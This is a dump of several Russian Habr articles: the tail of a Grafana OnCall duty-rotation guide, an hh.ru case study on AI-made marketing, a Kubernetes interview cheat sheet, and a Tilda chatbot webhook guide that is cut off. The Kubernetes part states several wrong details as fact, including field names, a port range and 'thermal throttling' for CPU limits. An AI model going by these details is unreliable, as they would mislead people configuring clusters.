Teams. Создаём команду. Добавляем туда всех, кто будет дежурить.Далее каждый участвующий в дежурстве человек должен зайти в свою учётку и привязать Slack-аккаунт: Alerts & IRM → OnCall → Users. Это нужно для автоматического назначения дежурного в тег.Этап 2: подготовка на стороне календаряСоздаем отдельный календарь, название – любое.В календаре создаем встречу. Тут есть пара нюансов:Вместо названия встречи нужно прописать юзернейм дежурного из Grafana. Указываем часы дежурства. Тут подойдут любые интервалы. Можно выставить весь день, в таком случае смена дежурного будет происходить по умолчанию в 00:00 UTC.Создаём ссылку на календарь: Настройки → Посмотреть все параметры Outlook → Общие календари → Публикация КалендаряОбязательно сделайте календарь публичнымКопируем isc-ссылку.Этап 3: создаем планировщик в Grafana OnCallВозвращаемся в настройки Grafana OnCall: Alerts & IRM → OnCall → SchedulesВыбираем свою команду, созданную ранее, затем создаем новый планировщик (New Schedule):Импортируем расписание (Import schedule from iCal Url)Заполняем обязательные поля, необходимые для запуска ротации:Name – название вашего дежурства;Primary schedule iCal URL – ссылка на календарь, созданная ранее;Assign to team – выбираем из дропдауна свою команду;Slack Channel – открытый канал, куда будем слать алерты;Slack user group – тег {teamName}_duty.После заполнения обязательных полей жмём Create Schedule. Синхронизация обычно занимает несколько секунд, по итогу видим наш график.You build it, you run itЭтот воркфлоу разом закрыл все наши перечисленные выше боли – как те, с которыми приходилось сталкиваться коллегам с запросами, так и для дежурных. Сейчас для того, чтобы сообщить о проблеме, не нужно искать какие-то таблички или оставлять безадресные сообщения. Любой желающий знает, что достаточно написать свой вопрос, проставить общий тег дежурного и конкретный человек займется твоим вопросом. Любой дежурный знает, не заглядывая в календарь, что сегодня его дежурство – Grafana OnCall в назначенное время присылает уведомление в мессенджер. Когда дежуришь, получаешь оповещения при упоминании общего тега. Сейчас канал с обращениями выглядит вот так:Если хочется узнать, кто конкретно сегодня дежурит, просто жмём на тег:Резюмируя все вышесказанное, могу сказать, что мы посчитали этот опыт удачным. Практику DevOps-инженеров подхватили разработчики – используют для дежурств по алертам и обработке обращений от коллег. Ещё эту практику сейчас внедряют у себя наши QA-инженеры, которые обрабатывают сообщения о проблемах клиентов на проде.Для того, чтобы схема заработала, достаточно оказалось выбрать подходящий инструмент; в нашем случае – Grafana OnCall. Но инструменты – это всего лишь инструменты; могут быть разные, и для получения нужного результата пользоваться ими можно по-разному. Что принципиально важно, без чего дежурства точно не поедут – зафиксировать договоренности, прозрачно и недвусмысленно. Так и запишем:Необходимое условие сетапа для дежурств: договориться о процессе;Достаточное: автоматизировать. ",2024-01-26
"ChatGPT + Kandinsky, или формула рекордного ROI на Чёрную пятницу",8,2,https://habr.com/ru/companies/hh/articles/788360/,"Привет! Я Женя, старший продуктовый маркетолог hh.ru, в компании отвечаю за развитие и продвижение всех карьерных сервисов для соискателей. В этой статье расскажу, как искусственный интеллект помог придумать проект на Чёрную пятницу и что из этого вышло (спойлер: проект окупился на 10 900%).Карьерный маркетплейс: сложности продукта и его продвиженияДля промо на Чёрную пятницу мы выбрали наш новый продукт для соискателей — Карьерный маркетплейс. Это сервис по подбору карьерного эксперта. Наставники помогают соискателям улучшить резюме, подготовиться к важному собеседованию или смене профессии, а ещё разработать персональный карьерный план.При продвижении Карьерного маркетплейса мы столкнулись с массой трудностей. Я бы описала продукт как «Новый. Сложный. Дорогой.»Новый. Запустили MLP (minimum loveable product) в сентябре 2023, и многие пользователи hh.ru ничего не знали про маркетплейс.Сложный. Пользователи не до конца понимают, какую ценность получат от использования продукта.Дорогой. Тут всё просто: средняя стоимость консультации — 8000 ₽.Черная пятница: чего мы хотели от проектаМы поставили довольно амбициозные, но всё же выполнимые цели и задачи на Чёрную пятницу. В основном мы сконцентрировались на повышении узнаваемости продукта, конечно, увеличении продаж.Вкратце, цели и задачи были такими:Увеличить выручку в два разаУвеличить охваты и привлечь 500 000+ посетителей на лендингРассказать о новом продукте и повысить его узнаваемостьКак обстояли дела перед запускомПеред запуском мы столкнулись с двумя серьёзными проблемами.Во-первых, мы обнаружили у себя командный кризис идей. Как бы мы ни пытались придумать интересную идею запуска, ничего круче стандартных тем и механик нам в голову не приходило.Ну и во-вторых, как это часто бывает, у нас горели дедлайны. Идеи сделать промо Карьерного маркетплейса на Чёрную пятницу появилась примерно за две недели до запуска, и затягивать уже было нельзя.Почему решили обратиться за помощью к искусственному интеллекту?Трезво оценив ситуацию, мы поняли, что нам нужна помощь. Выбор пал на нейросети. Почему? Потому что ИИ сегодня — огромный тренд, и мы хотели встать на эту волну хайпа. К тому же, этот кейс можно было потенциально использовать как дополнительный инфоповод.А ещё это было чистое любопытство: нам было интересно проверить, насколько хорошо нейросети справятся с креативными задачами. В результате мы остановили свой выбор на двух популярных нейронках.Встречайте наш проект «Мистерия карьерных советов».Автор идеи: ChatGTPДизайнер: KandinskyКак ChatGPT помогал нам придумать идеюОбщение с ChatGPT было довольно долгим и мы не сразу получили то, что хотели.Шаг 1. Попросили придумать простую механикуНам было важно, чтобы от пользователей не требовалось совершать много действий и переходов. Мы делали ставку на максимально простую, понятную и привычную механику.В итоге на этом этапе нам не понравилась ни одна идея, предложенная ChatGPT. Но мы не сдавались.Шаг 2. Добавили технического контекстаПопросили ИИ придумать механику, где пользователь искал бы скидки и бонусы на лендинге и добавили важное условие: без сложных доработок на бэкенде (мы помним, что сроки поджимали).Шаг 3. Ещё больше продуктового контекстаПодробно рассказали ChatGPT про Карьерный маркетплейс: что за сервис, зачем нужен и что есть на продуктовом лендинге.И на этом этапе мы наконец добились от ИИ того, чего хотели.Шаг 4. Выбрали название и идеюChatGPT предложил название для нашего проекта: «Мистерия карьерных советов». Идея — предсказания на карьерных картах Таро. А это, кстати, ещё один супер тренд сегодня.Вторая крутая идея ChatGPT — механика скрытых скидок. То есть пользователи выбирают услугу, но о самой скидке узнают только на последнем шаге.Шаг 5. Попросили ИИ «докрутить» идеюОпределившись с названием и идеей, нам оставались финальные штрихи: определиться со стилистикой проекта, сделать его более интересным и атмосферным.Итоговая механика была такой: на лендинге пользователи вытягивали карту Таро с карьерным предсказанием и получали скидку до 20% на услуги менторов Карьерного маркетплейса.Почему пошли за дизайном к Kandinsky?Не хватало опыта. У нас в команде есть продуктовый дизайнер, но он никогда не работал с лендингами для спецпроектов.Мало времени. Это причина, по которой наш дизайнер не успел бы обучиться дизайну лендингов, а найти внешнего иллюстратора для отрисовки кастомных карт Таро мы бы просто не успели.Юридические нюансы. Взять готовые картинки из интернета — тоже не вариант, потому что мы не хотели попасть на штрафы за нарушение авторских прав.Как итог — снова пошли за помощью к нейронкам.Как мы ставили ТЗ KandinskyПолучить от ИИ картинку, похожую на то, что ты придумываешь у себя в голове — задача не из лёгких. Поэтому делюсь, как мы добились нужных результатов от Kandinsky.Максимально конкретизировали промпт-запросы. Поскольку тематика была связана с Таро, мы упоминали в промпте названия конкретных карт, которые отобрали как подходящие. Согласитесь, карта Повешенного вряд ли добавляла бы радостной атмосферы проекту.Дали подробное описание самих картинок. Мы рассказали Kandinsky, что конкретно должны делать герои на изображении.Задали стиль. Чтобы картинки были консистентными и соответствовали общей стилистике проекта, мы попросили Kandinsky использовать в иллюстрациях стиль «классицизм».В итоге лендинг и сами карты выглядели так:По-моему, отличный результат, если учесть, что бо́льшую часть работы за нас сделал искусственный интеллект.Маркетинг и продвижение проектаЕщё одна неотъемлемая часть любого запуска — его продвижение. Чтобы рассказать пользователям о нашей акции, мы пользовались как внутренними, так и внешними каналами.In-app коммуникации — 50%На главном экране приложения hh.ru показывали пользователям карточку, а в профиле соискателя повесили баннер.Push-уведомления — 30%Мы сегментировали базу на небольшие группы в зависимости от карьерных задач соискателей.Пуши отправляли только тем, кто по профессиональным ролям подходил под ЦА проекта.Email-рассылки — 10%В маркетинговые письма мы тоже добавили немного атмосферы и дизайна от нашего проекта. Вместо стандартного простого дизайна использовали кастомный дизайн и структуру.Результаты проекта: оправдались ли наши ожидания?Более чем! Напомню, что основными целями были увеличение выручки в два раза, привлечение минимум 500 000 посетителей на лендинг и повышение узнаваемости продукта.Итоги за семь дней проекта были такими:~520 000 посетителей на лендинге — даже больше, чем мы рассчитывали.+160% к средней выручке. Здесь немного не дотянули, но результат всё равно хороший.Конверсия в продажу увеличилась в 3,2 раза.Что касается повышения узнаваемости, эту метрику отследить сразу невозможно. Мы планируем провести исследования и сравнить, насколько изменится уровень знания о продукте среди пользователей hh.ruТри критерия успехаМы проанализировали результаты проекта и выделили три основных критерия успешного запуска.Простая и виральная механика с одним шагом. Пользователи не любят, когда от них требуется много действий, а в нашем проекте было достаточно пары кликов.Удачные даты. Здесь мы очень старались обогнать конкурентов, поэтому решили провести Чёрную пятницу раньше остальных.Актуальность. Поддержали популярный тренд на карты Таро, магию и эзотерику.Немного о деньгах: сколько стоил этот запускНаконец мы подошли к самому интересному: раскрываю карты (не Таро) и цифры.Средняя стоимость разработки проекта подобного масштаба в креативном агентстве ~1,5 млн ₽. Мы же потратили ~10 человеко-часов: это работа маркетологов и дизайнера.Благодаря искусственному интеллекту мы успели запустить проект в очень сжатые сроки и сэкономили кучу денег на обращение в агентство.В результате ROI нашего проекта составил ~10 900%! Для сравнения: средний ROI для успешных проектов ~300%.Как эффективно использовать ИИ для креативных идей и изображенийМини-гайд для тех, кто вдохновится нашим кейсом и решит попробовать поработать на пару с нейронками.Чтобы ИИ сгенерировал классную идею, нужно:Определить форматы креативов. Дайте нейросетям понять, что вы от них хотите: лендинг, сценарий проекта или игровую механику. Сформулируйте запрос и напишите максимально детальный и понятный промпт.Быть проще. Здесь я имею в виду ваше общение с нейронками. Формулируйте запрос не просто чётко и понятно, но и старайтесь не использовать в нём сложные технические термины и аббревиатуры.Делиться информацией. Максимально подробно погрузите ИИ в контекст вашего продукта: расскажите, зачем он нужен, кто им пользуется и какие есть технические ограничения.Чтобы получить иллюстрации от ИИ, нужно:Давать больше конкретики. Максимально подробно распишите в промпте, какие предметы вы хотите видеть на картинке. Если на иллюстрациях есть персонажи, то расскажите, что они должны делать.Использовать негативные промпт-запросы. Если вы не хотите видеть на картинке какие-то элементы, напишите негативный промпт.Писать утвердительно. Не используйте отрицания в своих запросах. Вместо «Не закрашивай звёздочку» напишите «Оставь звёздочку прозрачной».А ещё friendly reminder для всех, кто пользуется нейросетями: общайтесь с ИИ вежливо.На что нас вдохновил успех Чёрной пятницыПосле Чёрной пятницы мы использовали искусственный интеллект в новогоднем спецпроекте. Пользователи писали свои карьерные желания на следующий год, а нейросети рассчитывали, вероятность исполнения этих желаний.В будущем мы хотим попробовать вывести ИИ в офлайн. Есть идея проверить, насколько хорошо нейронки справятся с задачей придумать оригинальную концепцию для офлайн-мероприятия.ИИ: да или нет? Наш вердиктДа, да, и ещё раз да! Нейросети дают много новых идей, которые можно использовать в своей работе. Поэтому наш вердикт — использовать и тестировать!Работайте совместно с ИИ, используйте его идеи и накладывайте их на свои — тогда результат будет максимально продуктивным. ИИ — ваш верный помощник в работе, но никак не инструмент для решения всех задач.",2024-01-26
Kubernetes: шпаргалка для собеседования,6,0,https://habr.com/ru/companies/gazprombank/articles/788978/,"Всем привет! Меня зовут Олег, я работаю исполнительным директором по разработке в Газпромбанке. На разных этапах карьеры я участвовал во многих собеседованиях, а в настоящее время сам собеседую кандидатов на должность инженеров DevOps и системных администраторов в Газпромбанке, вследствие чего у меня сформировалось некоторое представление о вопросах, которые могут быть заданы соискателям. И сейчас я хочу остановиться на разделе вопросов про Kubernetes.



Сразу хочу сказать, что изначально планировал сделать одну статью, но в итоге получилась такая простыня, что пришлось разделить текст на две части. Ссылку на вторую опубликую здесь, как только она появится. 

Вопросы по Kubernetes достаточно часты на собеседованиях на инженерные вакансии, связанные с администрированием и эксплуатацией. Они могут варьироваться от базовых, рассчитанных на механическую проверку теоретических знаний («объясните, что такое service») до более сложных и комплексных, требующих глубинного понимания внутренних принципов Kubernetes и работы (каким образом опубликовать приложение, развёрнутое в Kubernetes). Давайте пойдём от базы в направлении возрастания сложности.

Собеседования по Kubernetes (k8s) могут иметь различную специфику с акцентом на администрирование и эксплуатацию этой системы. В зависимости от этого, а также от персонального опыта интервьюера, могут задаваться и те вопросы, на которые кандидат не знает ответа.

В такой ситуации хорошим вариантом ответа может быть: «К сожалению, мне не приходилось сталкиваться с подобными кейсами на практике. Но я могу достаточно быстро найти ответ на этот вопрос при помощи поискового сервиса или нейронки, если возникнет такая необходимость». 

И это нормальный ответ. IT-индустрия достаточно большая, все в одну голову не вмещается.

— Что такое Kubernetes?
— На самом деле не самый простой и очевидный вопрос. Самый распространённый ответ — «система оркестрации контейнеров». На самом деле контейнер — слишком низкий уровень абстракции для k8s (он управляет POD’адми, на каждый POD создаётся минимум два контейнера). На мой взгляд, вариант, который более точно характеризует эту систему, скорее такой:

«Наиболее популярная на данный момент инфраструктурная платформа, содержащая в себе фреймворк для декларативного управления конфигурациями приложений на основе контейнеризации и (реже) виртуализации, которая в настоящее время является стандартом индустрии».

— Что такое POD?
— Группа контейнеров, объединённых общей сетью (общий localhost, общий внешний IP). Это может быть нужно для запуска созависимых сервисов, которые работают совместно по сети (например, связки nginx + php-fpm) или используют общие файловые ресурсы (например, продюсер и сборщик логов). 

— Для чего при старте PODа создаётся контейнер с процессом pause?
— Для PODа создаются как минимум два контейнера. Первый контейнер с pause служит для того, чтобы обеспечить общую сеть (для него создаётся network namespace в linux — то есть все контейнеры PODа должны располагаться на одной ноде).
— Каким образом мы можем запустить в Kubernetes приложение (варианты: рабочую нагрузку, workload)?
— Мы можем запускать PODы поодиночке, но, как правило, для этого используются более функциональные сущности (workloads):


Deployment — служит для развёртывания нужного количества PODов на основе единого шаблона;
StatefulSet — похож на Deployment, но оптимизирован под работу со stateful-приложениями;
DaemonSet — позволяет развернуть один экземпляр приложения на каждом доступном узле (применяется, как правило, для нужд, связанных с обслуживанием узлов);
Job — способ запустить конечный процесс в контейнере и дождаться его успешного выполнения (описав при этом политики запуска вроде длительности и количества рестартов в случае падения);
CronJob — то же, что и Job, но с запуском по расписанию. При этом ведётся журнал успешности запусков.

Есть ещё ReplicationController, но он считается устаревшим и практически не используется. На смену ему пришел Deployment.

— Что такое ReplicaSet?
— ReplicaSet — это сущность, которой управляет Deployment. Deployment создаёт новый ReplicaSet каждый раз, когда в его конфигурации происходят изменения, после чего происходит завершение PODов старого ReplicaSet и запуск PODов нового. При помощи ReplicaSet мы можем (в том числе) делать откат на предыдущие версии Deployment.

— Что такое Kubernetes probes?
— Это проверки, которые осуществляются в течение жизненного цикла PODа. Они описываются для каждого контейнера PODа. Существуют три вида проверок.

Startup probe — запускается сразу после старта PODа и применяется для приложений, которые имеют длительную процедуру инициализации. Пока она не завершена, другие пробы не запускаются.
Readiness probe — проверка готовности PODа обрабатывать трафик (POD не добавляется в маршрутизацию трафика в service, если эта проверка не пройдена).
Liveness probe — проверяет, функционирует ли приложение (в случае, если проверка не завершилась успехом, процесс в контейнере PODа перезапускается).

Существуют exec-, http-, tcp- и gprc-пробы. Проверки осуществляются сервисом kubelet на ноде, где запущен целевой POD.

— Какие существуют хорошие практики для создания проб?
— Пробы должны проверять функционал приложения, задействованный в обработке запросов пользователя. Например, если в приложении есть панель администратора и вебсайт, то проверять нужно ответ от сайта, причем не какой-то синтетический location, отдающий простой код ответа, но запуск простой функции, которая должна использовать механизмы приложения, близкие к обработке реальных пользовательских запросов.

Пробы — это дополнительная нагрузка на инфраструктуру, поэтому они не должны осуществлять тяжелые, ресурсоёмкие запросы к приложению, равно как и не должны запускаться слишком часто. По возможности, пробы также не должны проверять функционал, зависящий от внешних сервисов, — иначе можно получить каскадный сбой. Нужно быть очень осторожным с liveness-пробами, — они перезапускают процесс в контейнере и могут вызвать дополнительные проблемы, когда, например, на приложение пришла высокая нагрузка, оно занято обработкой пользовательских запросов и не может ответить на liveness-пробу (лучше сделать выделенный пул воркеров на прохождение liveness-пробы, если проверяемый сервис это позволяет). Лучше всего создавать сквозные проверки для readiness-пробы — например, если в PODе связка nginx + php-fpm, проверять можно только location nginx, который проксирует php-fpm (одним запросом проверяются оба сервиса).

— Что такое Pod Disruption Budget (PDB)?
— Это функционал k8s, позволяющий держать запущенными минимально необходимое количество PODов приложения. То есть при возникновении события вроде evict’а PODов с ноды, drain`а ноды, удаления PODов и прочего k8s не удалит PODы, если общее количество PODов приложения ниже PDB.

— Что такое priority classes?
— Это механизм k8s, позволяющий указать важность PODов для наших процессов. Например, если в одном кластере k8s у нас продуктовый и тестовые окружения, мы можем повысить priority class для PODов продуктового, и если, например, возникнет недостаток ресурсов на ноде, первыми для evict’а будут выбраны PODы тестовых окружений.

— Что такое POD eviction?
— Это механизм, позволяющий освободить ноду от лишних PODов. Бывают evict’ы по ресурсам (когда на ноде не хватает памяти, места на диске или количества PID для процессов) и посредством вызова API — когда мы запускаем kubectl drain node.

— Каким образом мы можем управлять размещением PODов на конкретных нодах кластера k8s?
— Для этого существует несколько возможностей. 

NodeSelector/node affinity — механизм, позволяющий запускать PODы на нодах с определённым набором меток (labels). Это может быть полезно, если, например, PODы требуют определённого оборудования — скажем, у нас есть пул нод с GPU для нужд машинного обучения.
taints/tolerations — механизм, позволяющий запрещать запуск на ноде PODов (taint — описывается на ноде), которые не имеют разрешения (toleration — описывается на POD’е). Это может быть полезно, если у нас в кластере несколько окружений — мы можем выделить ноды под production и при помощи taint запретить запускать там PODы тестовых окружений.
pod affinity/antiAffinity — механизм, позволяющий группировать PODы разных приложений на общих нодах (если, например, им важен быстрый сетевой доступ) или наоборот — заставлять их запускаться на разных нодах (например, чтобы распределить PODы одного приложения по нодам кластера для повышения отказоустойчивости в случае сбоя на ноде).


— Каким образом мы можем управлять вычислительными ресурсами в k8s?
— Для управления ресурсами в кластере k8s служат resources requests / limits. Их можно выставить для CPU, memory и в последних версиях k8s — для GPU.

Requests применяются для того, чтобы определить, сколько ресурсов обычно потребляет наше приложение — на основании этих данных Kubernetes scheduler будет осуществлять выбор нод для запуска PODов (сумма request’ов всех контейнеров всех PODов должна быть меньше доступных на ноде ресурсов).

Limits применяются как предохранительный механизм, ограничивающий потребление ресурсов конкретным контейнером PODа. В случае превышения лимита процессорного времени будет применяться механизм thermal throttling, в случае превышения лимита памяти, — механизм OOM.

Модель выделения ресурсов, при которой requests меньше limits, называют burstable QoS, requests равно limits — guaranteed QoS. 

Кроме того, мы можем выставить квоты ресурсов (resource quotas) на namespace (квоты по CPU, памяти, количеству запущенных PODов и размеру диска заказанных persistent volume), а также описать требования к resources requests, которые должны быть описаны на POD’ах в namespace при помощи limit ranges.

Также ресурсами приложений можно управлять при помощи автоскейлеров. В k8s из коробки доступны: 

HPA — horizontal pod autoscaler, который может увеличивать или уменьшать количество PODов приложения в зависимости от потребления ими CPU и/или памяти);
VPA — vertical pod autoscaler, который может управлять resources requests / limits (есть разные режимы работы — от рекомендательного до принудительного изменения конфигурации ресурсов и перезапуска PODов с новыми настройками).

Еще есть реализации автоскейлеров, которые при работе могут использовать какие-то внешние метрики (скажем, длину очереди), например carpenter или KEDA. Если кластер работает в облачном окружении, мы можем использовать cluster autoscaler для заказа новых нод или удаления лишних, в зависимости от общей утилизации групп нод.

— Каким образом мы можем улучшить стабильность работы приложения в k8s?
— Прежде всего мы должны описать probe для контейнеров в PODе, а также resources requests / limits. Далее лучше всего описать antiAffinity для PODов наших приложений, чтобы легче переживать сбои на конкретных нодах.

Если у нас в кластере работают как продуктовые, так и тестовые окружения, то хорошей практикой будет описать node selector и taints/tolerations, чтобы запускать production-приложения на выделенных нодах.

Если возможности выделить ноды под production нет или в рамках production мы можем выделить особо важные (core) сервисы, для них стоит поднять priority classes. Также есть смысл описать pod distruption budget для особо важных приложений. В случае с многопользовательской (multitenant) моделью использования кластера в неймспейсах пользователей стоит описывать resourceQuotas и limitRanges.

— Что такое Kubernetes service?
 Это объект, который выполняет несколько важных функций.

Разрешение DNS-имён: сервис предоставляет символьное DNS-имя, формирующееся на основе имени сервиса, неймспейса приложения и DNS-суффикса кластера для единообразного доступа к приложениям. Плюс сервисы с типом externalName могут описывать произвольные A-записи во внутреннем DNS кластера.
Маршрутизация и балансировка трафика: сервис может предоставлять IP-адрес, при обращении к которому при помощи алгоритма round robin балансирует трафик на PODы приложения, либо выдавать IP-адреса PODов приложения на запрос к своему DNS-имени для организации балансировки на уровне приложения (режим headless с настройкой clusterIp: no).
Service discovery: на основании описанных в нём меток service ищет PODы, которые соответствуют этим меткам и прошли readiness-пробу, и добавляет их в маршрутизацию трафика.
Публикация приложений: мы можем использовать сервисы для того, чтобы предоставлять внешним пользователям доступ к приложениям в кластере.

— Каким образом мы можем предоставить приложение, которое работает в нашем кластере, k8s нашим пользователям?
— Если наше приложение работает по протоколу HTTP, мы можем использовать так называемый ingress-контроллер — реверс-прокси, интегрированный с Kubernetes API, который позволяет на основе описанных custom resources осуществлять маршрутизацию трафика по HTTP.

Можно использовать Kubernetes service для ряда задач.

С типом externalIp — чтобы опубликовать порт сервиса на конкретных IP-адресах наших нод; с типом nodePort — чтобы опубликовать порт сервиса на всех нодах на произвольных портах в диапазоне от 30000 до 64535 (при этом есть интересная опция trafficPriority: local, позволяющая предпочитать PODы приложения, находящегося на локальной ноде при маршрутизации трафика).
С типом loadBalancer — если наш k8s работает в облаке. При этом создаётся сервис, аналогичный nodePort, но вдобавок к нему заказывается load balancer, который осуществляет маршрутизацию на ноды кластера в порты, выбранные для nodePort.
Можно использовать kubectl proxy, чтобы пробросить порт сервиса локально на нашу машину (может быть полезно для нужд разработки).
Мы можем использовать nodeNetwork: true (проверить, когда появится Интернет), чтобы разрешить приложению, работающему в контейнере, использовать сеть ноды и занимать сетевые порты непосредственно на интерфейсах ноды.


— Что такое Kubernetes ingress?
— Это реверс-прокси, интегрированный с Kubernetes API, который позволяет на основе описанных в кластере специальных custom resources осуществлять доставку пользовательского трафика до приложений, развёрнутых в кластере. Существует множество реализаций этого паттерна. Например, ingress-nginx от создателей k8s на базе nginx или router в openshift на базе haproxy. Помимо доставки трафика, ингрессы позволяют создавать HTTPS-соединения на основе сертификатов, полученных, к примеру, от letsencrypt при помощи cert manager, а также делать многие другие вещи вроде timeouts/retry, limits, session affinity / sticky sessions, маршрутизации трафика для канареечных выкатов и т. п.

— Можем ли мы опубликовать приложение, работающее по бинарному протоколу, например postgresql, через ingress?
— Да, многие ингресс-контроллеры поддерживают публикацию бинарных протоколов, но это неудобно. Kubernetes ingress сам, как правило, публикуется при помощи Kubernetes service. Для каждой публикации приложения по бинарному протоколу через ingress придётся дополнительно описывать Kubernetes service.

— Если нам всё равно нужно описывать Kubernetes service для публикации ingress, то зачем нам ingress?
— Преимущество ingress-контроллера в том, что, опубликовав его единожды, мы получим возможность доставлять через него трафик всем нашим приложениям внутри кластера k8s, которые работают по HTTP на основе маршрутизации по URL/locations, HTTP headers и cookie. А также, если появится такая необходимость, мы сможем использовать несколько ingress-контроллеров в кластере, разделяя их по ingress class.

— Допустим, у нас postgresql в кластере k8s, и разработчики просят к ней доступ. Каким образом мы можем решить этот вопроc?
— Прежде всего, мы можем развернуть в кластере веб-основанный тулинг для работы с базой, например pgadmin, и опубликовать его через ingress для разработчиков.

Есть также вариант с использованием какого-нибудь инструмента для доступа разработчика к кластеру (например, Kubernetes dashboard или LENS) с возможностью сделать exec в POD и доступа к базе через утилиту командной строки.

Если разработчикам всё-таки нужен прямой сетевой доступ к базе (например, для использования своего любимого инструмента работы с БД), мы можем завести аккаунт для разработчиков в кластере и использовать kubectl proxy для публикации порта базы на localhost машины разработчика. Либо поднять в кластере сервер vpn.

На худой конец, есть возможность опубликовать базу через Kubernetes service или ingress, но в данном случае нам нужно позаботиться о защите соединения с БД (пользователи, доступы) и протокола (включить шифрование).

На этом пока все. Продолжение во второй части.",2024-01-26
Tilda и чат-бот: пример интеграции,6,0,https://habr.com/ru/companies/chatapp/articles/788190/,"Привет, друзья! Сегодня мы поговорим о том, как  добиться эффективной обработки заказов, оформленных на сайте стандартного интернет-магазина на Tilda. Я на примере своего проекта (интернет-магазин карликовых кроликов) расскажу, почему менеджерам неудобно работать с заявками, которые приходят из Tilda напрямую, а также покажу, как можно подключить к обработке заказов чат-бота на примере сервиса ChatApp. Мы поговорим о принципе этой интеграции (то есть о механизме вебхука) и о проверенных на практике сценариях использования бота. Статья будет полезна тем, у кого уже есть сайт на Tilda (или скоро будет), и кто хочет автоматизировать коммуникацию так, чтобы она была комфортна и заказчику, и менеджерам, и конечно, владельцу проекта.В своей первой статье я говорил о работе с Авито.Мессенджером, и мы обсуждали, как сохранить коммуникацию с клиентами, даже если они пришли в 4 утра. Вторая статья была о подключении чат-бота к основному общению с клиентами в мессенджере. Но сегодня мы говорим об оформлении заявки с сайта. Здесь многое меняется, потому что после нажатия кнопки ""оформить заявку"" вероятность завершения покупки составляет порядка 90%, и выстроить коммуникацию так, чтобы она была комфортной для клиента, а также решала мои задачи, как владельца бизнеса, очень важно.Вот что я расскажу в этой статье подробнее: Как происходит передача заказа из Tilda в чат-ботКак считывать вложенные параметры из вебхукаПлюсы использования чат-бота для согласования доставкиСбор обратной связи и отзывовКак сделать так, чтобы бот не надоедал клиенту после завершения общенияПредисловие. Почему Tilda, и зачем нам чат-бот?Сегодня мало кто хочет тратить уйму времени и ресурсов на разработку и поддержку интернет-магазина, особенно если от него не требуется ничего специфического. Как и многие другие, вместо этого я хотел взять какой-то простой и понятный конструктор с достаточно широкими возможностями. Tilda идеально подошла для этой задачи.Итак, сайт был сделан, механизм раскладывания кроликов и аксессуаров — продуман, товары готовы к заказу (не будем здесь говорить об этом слишком подробно, материалов по Tilda на Хабре достаточно). И когда пользователь оформляет покупку, Tilda предлагает ему заполнить вот такую форму.Далее можно отправить это все на почту менеджеру. Но тогда мы получаем большую зависимость от ручной обработки заявок -- письмо можно не заметить, пропустить, забыть отправить ответ. Потерять оформившего заказ из корзины клиента всегда очень обидно. Поэтому мне хотелось запустить процесс коммуникации сразу после оформления, чтобы клиент знал, что мы уже думаем о том, как привести ему кролика. И как раз здесь отлично подходит чат-бот.Подключаем чат-бота — используем вебхукСделать это, как выяснилось, очень просто, потому что Tilda, к нашей радости , поддерживает вебхуки.Webhook – это автоматически сгенерированный HTTP-запрос, созданный на основе каких-либо данных. Вебхук запускается по предопределенному событию  в исходной системе и передается другой системе моментальноЭтот механизм позволяет передать данные подобного запроса непосредственно в бота ChatApp. И что самое важное, передача происходит без задержек.Правда, чтобы Tilda начала отдавать вебхук, нужно его настроить. Для этого придется сделать пару кликов мышкой.Сначала зайдем в конструктор бота ChatApp и начнем создавать цепочку действий, которая будет начинаться с Вебхука.В модуле ""входящий webhook"" нужно вписать имена переменных, которые вам понадобятся. В самом простом из моих сценариев, это были имя (name_id) и телефон (phone_id). Можно добавить и другие, но главное чтобы переменные отличались от системных переменных ChatApp (то есть брать name и phone нельзя). И еще -- не забудьте зафиксировать соответствие этих переменных значениям заполняемых форм в Tilda, иначе в вебхук уйдут пустые строки.прописываем переменные в настройках формы TildaВнизу блока aимеется ссылка. Нужно ее скопировать. После этого мы открываем панель управления  Tilda и заходим в раздел ""настройки"" В самом низу вы найдете раздел настройки вебхукаКак только вы зайдете в этот раздел, Tilda предложит вам ввести скрипт для вебхука:Никаких больше параметров вводить не нужно – название API и ключ тут не требуется. Единственное, что нужно выбрать – это метод запроса. Интеграция через вебхук будет работать только в том случае, если вы поставите POST. Также необходимо отметить вот эти два чекбокса:Если все пройдет правильно,  вы получаете вот такое сообщение.После такого подключения Tilda каждый раз отправляет webhook в моего чат-бота, когда очередной пользователь складывает кроликов и аксессуары в корзину и оформляет заявку. Чат-бот начинает диалогДальше вся ""магия"" идет на стороне ChatApp. Вот как выглядит базовый сценарий уже в конструкторе бота. В отличие от кейсов, про которые мы говорили в предыдущих статьях, в этом случае общение с клиентом начинается с блока Входящий webhook в конструкторе ChatApp. Он инициирует дальнейшую коммуникацию и от него мы простраиваем дальнейший сценарий общения (в данном случае инициируются коммуникации через каналы WhatsApp business API (WABA) и personal Telegram)На скриншоте видно, что я использовал в поле name_id, чтобы получить из Tilda имя клиента, а также phone_id, чтобы узнать его телефон. Во втором блоке конструктора мы заключаем эти названия полей в двойные фигурные скобки, и тогда вместо {{name_id}} будет имя клиента, а вместо {{phone_id}} – его номер телефона. Третий блок – создает условие: если клиент что-то ответил на приветствие, диалог будет передан оператору, если нет – то вы можете предусмотреть какие-то другие действия.Самый простой вариант использования такой связки — сообщить клиенту:“Здравствуйте, ваш заказ №12345 принят! Менеджер свяжется с вами в течение 24 часов!”Вот как выглядит отправка персонализированного сообщения из конструктора ботов ChatApp.Узнать больше...Но давайте вернемся к настройке вебхука в Tilda. Как вы помните, мы попросили Tilda отправлять нам данные ""массивом"", а также в формате файла JSON. Формате JSON при желании позволяет извлечь все составляющие заказа. На скрине ниже – пример такого JSON-сообщения, которое передается вебхуком из Tilda. По названиям переменных можно выбрать нужные данные для дальнейшей обработки.К слову, разбирая список покупок из JSON-файла, я как раз настроил передачу заказа менеджеру прямо в чате – то есть содержимое корзины и адрес доставки. Чтобы ChatApp обработал их, нужно разобрать данные из вебхука по соответствующим переменным. Названия переменных можно посмотреть в Tilda. По умолчанию конструктор сайтов использует стандартные переменные, которые можно узнать из документации Tilda.Я, например, вытаскиваю из вебхука все позиции заказа, чтобы специально дублировать всю информацию со ссылками на наш сайт прямо в чат. Конечно, этого можно было бы и не делать. Но если все позиции уже есть в чате, менеджеру не нужно залезать в Битрикс для дальнейшей работы с клиентом. Это, как показала практика, экономит кучу времени. Вот так выглядит мое сообщение клиенту от бота.Менеджер ушел…а диалог продолжаетсяМожет ли бот быть полезен клиенту без менеджера? Очень даже может! Мы, например, зашили в бота рекомендации и правила по обращению с кроликами.У нас есть раздел на сайте “Вопрос и ответ”, в котором около 50 готовых советов и лайфхаков по содержанию карликовых 